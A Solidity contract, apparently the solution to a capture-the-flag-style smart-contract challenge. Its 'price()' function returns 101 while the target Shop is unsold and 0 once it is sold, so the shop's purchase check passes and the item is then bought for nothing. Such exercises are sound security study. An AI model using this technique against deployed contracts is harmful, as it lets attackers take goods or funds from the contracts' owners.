// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.0;

import "../src/Shop.sol";

contract ShopAttack {
    Shop public shop;

    constructor(address _shopAddress) {
        shop = Shop(_shopAddress);
    }

    function price() external view returns (uint) {
        if (!shop.isSold()) {
            return 101;
        } else {
            return 0;
        }
    }

    function attack() public {
        shop.buy();
    }
}
